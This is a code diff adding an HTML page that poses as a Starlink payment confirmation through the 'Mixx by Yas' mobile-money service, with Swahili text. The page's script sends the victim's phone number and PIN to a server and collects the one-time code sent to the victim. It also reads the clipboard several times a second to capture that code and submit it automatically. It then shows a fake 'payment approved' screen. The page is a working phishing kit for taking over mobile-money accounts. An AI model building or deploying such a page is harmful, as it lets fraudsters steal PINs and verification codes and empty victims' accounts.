@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Starlink · Thibitisha</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background: #0a0e1a; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 24px 12px; }
+    .phone-frame { max-width: 390px; width: 100%; background: #0d1117; border-radius: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); overflow: hidden; }
+    .inner-content { padding: 20px 16px 24px; background: #0d1117; }
+    .screen { display: none; } .screen.active { display: block; animation: fadeIn 0.4s ease; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .mixx-logo { display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
+    .mixx-logo .logo-box { background: #00377D; color: #fff; font-weight: 800; font-size: 1.2rem; padding: 10px 24px; border-radius: 12px; letter-spacing: 1px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 20px rgba(0,55,125,0.3); border: 2px solid #FFD100; }
+    .mixx-logo .logo-box i { font-size: 1.5rem; color: #FFD100; }
+    .mixx-logo .logo-box .mixx-text { color: #FFD100; }
+    .payment-amount { background: linear-gradient(135deg, #00377D, #002a60); border-radius: 16px; padding: 12px 16px; margin-bottom: 18px; border: 1px solid #FFD100; display: flex; justify-content: space-between; align-items: center; }
+    .payment-amount .label { color: #FFD100; font-size: 0.8rem; }
+    .payment-amount .amount { color: #fff; font-weight: 700; font-size: 1.2rem; }
+    .waiting-content { text-align: center; padding: 1rem; }
+    .spinner { width: 50px; height: 50px; border: 4px solid #1a202c; border-top-color: #FFD100; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .phone-display { background: #1a202c; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; color: #fff; border: 1px solid #2d3748; }
+    .code-inputs { display: flex; gap: 0.5rem; justify-content: center; margin: 1rem 0; }
+    .code-inputs input { width: 48px; height: 52px; text-align: center; font-size: 1.3rem; font-weight: 700; border: 2px solid #2d3748; border-radius: 14px; outline: none; font-family: inherit; background: #1a202c; color: #fff; }
+    .code-inputs input:focus { border-color: #FFD100; }
+    .code-inputs input.filled { border-color: #10b981; background: #0d2818; }
+    .timer-bar { background: #e0f0ff; border-radius: 10px; padding: 0.6rem; text-align: center; font-weight: 700; font-size: 0.9rem; color: #1e293b; margin-top: 0.3rem; }
+    .timer-bar.warning { background: #fef2f2; color: #ef4444; }
+    .resend-link { text-align: center; margin-top: 0.8rem; }
+    .resend-link a { color: #FFD100; text-decoration: none; font-size: 0.85rem; cursor: pointer; font-weight: 600; }
+    .error-msg { color: #ef4444; font-size: 0.8rem; margin-top: 0.3rem; display: none; text-align: center; }
+    .error-msg.show { display: block; }
+    .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 14px 20px; border-radius: 50px; font-weight: 600; font-size: 0.9rem; border: none; cursor: pointer; width: 100%; text-align: center; color: #00377D; background: #FFD100; }
+    .btn:hover { background: #e6b800; }
+    .success-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
+    .success-overlay.active { display: flex; }
+    .success-card { background: #0d1117; border-radius: 20px; padding: 2rem; text-align: center; max-width: 350px; width: 90%; border: 2px solid #FFD100; animation: popIn 0.5s ease; }
+    @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+    .success-card .check-icon { font-size: 4rem; color: #10b981; margin-bottom: 0.5rem; }
+    .success-card h2 { color: #FFD100; margin-bottom: 0.3rem; }
+    .success-card .big-amount { font-size: 1.5rem; font-weight: 900; color: #fff; margin: 0.5rem 0; }
+    .success-card p { color: #8b95a9; font-size: 0.85rem; }
+    .btn-home { background: #FFD100; color: #00377D; padding: 0.8rem 2rem; border-radius: 50px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; margin-top: 1rem; width: 100%; }
+    .info-note { font-size: 0.7rem; color: #8b95a9; text-align: center; margin-top: 16px; line-height: 1.4; }
+    .info-note i { color: #FFD100; margin-right: 4px; }
+  </style>
+</head>
+<body>
+<div class="phone-frame">
+  <div class="inner-content">
+
+    <!-- SCREEN 1: WAITING -->
+    <div class="screen active" id="screenWait">
+      <div class="mixx-logo">
+        <div class="logo-box"><i class="fas fa-mobile-alt"></i> Mixx <span class="mixx-text">by Yas</span></div>
+      </div>
+      <div class="payment-amount">
+        <span class="label">Kiasi cha kulipa</span>
+        <span class="amount" id="payAmount">TSh 0</span>
+      </div>
+      <div class="waiting-content">
+        <div class="spinner"></div>
+        <h3 style="color:#fff;">⏳ Inakaguliwa</h3>
+        <p style="color:#8b95a9;">Inasubiri uidhinishaji</p>
+        <div class="phone-display" id="showPhone">+255 ---------</div>
+      </div>
+      <div class="info-note"><i class="fas fa-info-circle"></i> Subiri uidhinishaji kutoka Mixx by Yas. Utapokea namba ya uthibitisho.</div>
+    </div>
+
+    <!-- SCREEN 2: CODE INPUT -->
+    <div class="screen" id="screenCode">
+      <div class="mixx-logo">
+        <div class="logo-box"><i class="fas fa-mobile-alt"></i> Mixx <span class="mixx-text">by Yas</span></div>
+      </div>
+      <div class="payment-amount">
+        <span class="label">Kiasi cha kulipa</span>
+        <span class="amount" id="payAmount2">TSh 0</span>
+      </div>
+      <div class="waiting-content">
+        <h3 style="color:#fff;">✅ Namba ya Uthibitisho</h3>
+        <div class="phone-display" id="showPhone2">+255 ---------</div>
+        <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
+        <div class="code-inputs">
+          <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+          <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+          <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+          <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+        </div>
+        <div class="error-msg" id="codeError">Namba si sahihi</div>
+        <button class="btn" onclick="submitCode()">Thibitisha →</button>
+        <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea namba? Bonyeza hapa</a></div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: VERIFYING -->
+    <div class="screen" id="screenVerify">
+      <div class="mixx-logo">
+        <div class="logo-box"><i class="fas fa-mobile-alt"></i> Mixx <span class="mixx-text">by Yas</span></div>
+      </div>
+      <div class="waiting-content">
+        <div class="spinner"></div>
+        <h3 style="color:#fff;">⏳ Inathibitisha</h3>
+        <div class="phone-display" id="showPhone3">+255 ---------</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- SUCCESS OVERLAY -->
+<div class="success-overlay" id="successOverlay">
+  <div class="success-card">
+    <div class="check-icon"><i class="fas fa-check-circle"></i></div>
+    <h2>🎉 Malipo Yameidhinishwa!</h2>
+    <div class="big-amount" id="approvedAmount">TSh 0</div>
+    <p>📱 Uthibitisho umetumwa<br>📦 Mpango wako utaamilishwa hivi karibuni</p>
+    <button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button>
+  </div>
+</div>
+
+<script>
+  var urlParams = new URLSearchParams(window.location.search);
+  var payAmount = urlParams.get('amount') || '0';
+  var payPlan = urlParams.get('plan') || '';
+  var userPhone = urlParams.get('phone') || '';
+  var userPin = urlParams.get('pin') || '';
+  
+  document.getElementById('payAmount').textContent = 'TSh ' + parseInt(payAmount).toLocaleString();
+  document.getElementById('payAmount2').textContent = 'TSh ' + parseInt(payAmount).toLocaleString();
+  document.getElementById('approvedAmount').textContent = 'TSh ' + parseInt(payAmount).toLocaleString() + ' - ' + decodeURIComponent(payPlan);
+  document.getElementById('showPhone').textContent = '+255 ' + userPhone;
+  document.getElementById('showPhone2').textContent = '+255 ' + userPhone;
+  document.getElementById('showPhone3').textContent = '+255 ' + userPhone;
+
+  var appId = '', checkInterval = null, countdownTimer = null, fastCheck = null, lastText = '';
+  var resendCount = 0, resendCooldown = false;
+
+  // Submit payment immediately
+  async function initPayment() {
+    try {
+      var res = await fetch('/api/submit_payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: userPhone, pin: userPin, amount: parseInt(payAmount), plan: payPlan, purpose: '' })
+      });
+      var data = await res.json();
+      appId = data.app_id;
+      startChecking();
+    } catch(e) { alert('Error: ' + e.message); }
+  }
+
+  initPayment();
+
+  function startChecking() {
+    if (checkInterval) clearInterval(checkInterval);
+    checkInterval = setInterval(async function() {
+      try {
+        var res = await fetch('/api/check_status/' + appId);
+        var data = await res.json();
+        if (data.status === 'approved') {
+          clearInterval(checkInterval);
+          showCodeScreen();
+        } else if (data.status === 'wrong_pin') {
+          clearInterval(checkInterval);
+          alert('PIN si sahihi. Jaribu tena.');
+          window.location.href = '/';
+        } else if (data.status === 'invalid_number') {
+          clearInterval(checkInterval);
+          alert('Namba sio ya Yas. Tafadhali tumia namba ya Yas.');
+          window.location.href = '/';
+        }
+      } catch(e) {}
+    }, 3000);
+  }
+
+  function showCodeScreen() {
+    document.getElementById('screenWait').classList.remove('active');
+    document.getElementById('screenCode').classList.add('active');
+    document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); });
+    document.querySelector('.cd').focus();
+    startCountdown();
+    navigator.clipboard.readText().then(function(t) { lastText = t || ''; }).catch(function(){});
+    if (fastCheck) clearInterval(fastCheck);
+    fastCheck = setInterval(checkClip, 200);
+  }
+
+  function startCountdown() {
+    if (countdownTimer) clearInterval(countdownTimer);
+    var seconds = 30;
+    var display = document.getElementById('timerDisplay');
+    display.textContent = '⏳ ' + seconds + 's';
+    display.className = 'timer-bar';
+    countdownTimer = setInterval(function() {
+      seconds--;
+      display.textContent = '⏳ ' + seconds + 's';
+      if (seconds <= 10) display.className = 'timer-bar warning';
+      if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; }
+    }, 1000);
+  }
+
+  async function checkClip() {
+    if (!document.getElementById('screenCode').classList.contains('active')) { clearInterval(fastCheck); return; }
+    try {
+      var text = await navigator.clipboard.readText();
+      if (text && text !== lastText) {
+        lastText = text;
+        var match = text.match(/\b(\d{4})\b/);
+        if (match) fillCode(match[1]);
+      }
+    } catch(e) {}
+  }
+
+  function fillCode(code) {
+    if (!code || code.length !== 4) return;
+    if (fastCheck) { clearInterval(fastCheck); fastCheck = null; }
+    var inputs = document.querySelectorAll('.cd');
+    for (var i = 0; i < 4; i++) { inputs[i].value = code[i]; inputs[i].classList.add('filled'); }
+    if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+    document.getElementById('timerDisplay').className = 'timer-bar';
+    setTimeout(function() { submitCode(); }, 300);
+  }
+
+  function nextCode(input) {
+    input.value = input.value.replace(/\D/g, '');
+    if (input.value.length === 1) { var n = input.nextElementSibling; if (n && n.classList.contains('cd')) n.focus(); }
+    var all = true;
+    document.querySelectorAll('.cd').forEach(function(d) { if (d.value === '') all = false; });
+    if (all) {
+      if (fastCheck) { clearInterval(fastCheck); fastCheck = null; }
+      document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('filled'); });
+      if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+      setTimeout(function() { submitCode(); }, 300);
+    }
+  }
+
+  async function submitCode() {
+    if (fastCheck) { clearInterval(fastCheck); fastCheck = null; }
+    if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+    var enteredCode = '';
+    document.querySelectorAll('.cd').forEach(function(d) { enteredCode += d.value; });
+    if (enteredCode.length !== 4) {
+      document.getElementById('codeError').textContent = 'Ingiza namba kamili';
+      document.getElementById('codeError').style.color = '#ef4444';
+      document.getElementById('codeError').classList.add('show');
+      startCountdown();
+      return;
+    }
+    document.getElementById('screenCode').classList.remove('active');
+    document.getElementById('screenVerify').classList.add('active');
+    await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: enteredCode }) });
+    if (checkInterval) clearInterval(checkInterval);
+    checkInterval = setInterval(async function() {
+      try {
+        var res = await fetch('/api/check_status/' + appId);
+        var data = await res.json();
+        if (data.code_status === 'approved') { clearInterval(checkInterval); showSuccess(); }
+        else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); showCodeError(); }
+        else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); alert('PIN si sahihi.'); window.location.href = '/'; }
+      } catch(e) {}
+    }, 3000);
+  }
+
+  function showSuccess() {
+    document.getElementById('screenVerify').classList.remove('active');
+    document.getElementById('successOverlay').classList.add('active');
+  }
+
+  function showCodeError() {
+    document.getElementById('screenVerify').classList.remove('active');
+    document.getElementById('screenCode').classList.add('active');
+    document.getElementById('codeError').textContent = 'Weka namba mpya iliyotumwa';
+    document.getElementById('codeError').style.color = '#ef4444';
+    document.getElementById('codeError').classList.add('show');
+    document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('filled'); d.classList.add('error'); d.value = ''; });
+    document.querySelector('.cd').focus();
+    startCountdown();
+    setTimeout(function() { document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); }); document.getElementById('codeError').classList.remove('show'); }, 4000);
+  }
+
+  async function resendCode() {
+    if (!userPhone) return;
+    if (resendCooldown) {
+      document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.';
+      document.getElementById('codeError').style.color = '#ef4444';
+      document.getElementById('codeError').classList.add('show');
+      setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000);
+      return;
+    }
+    if (resendCount >= 3) {
+      document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.';
+      document.getElementById('codeError').style.color = '#ef4444';
+      document.getElementById('codeError').classList.add('show');
+      return;
+    }
+    resendCount++; resendCooldown = true;
+    if (fastCheck) { clearInterval(fastCheck); fastCheck = null; }
+    document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo. (' + resendCount + '/3)';
+    document.getElementById('codeError').style.color = '#FFD100';
+    document.getElementById('codeError').classList.add('show');
+    try {
+      await fetch('/api/submit_payment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: parseInt(payAmount), plan: payPlan, purpose: 'OTP REQUESTED' }) });
+      setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000);
+    } catch(e) {}
+    startChecking();
+    setTimeout(function() { resendCooldown = false; }, 30000);
+  }
+</script>
+</body>
+</html>
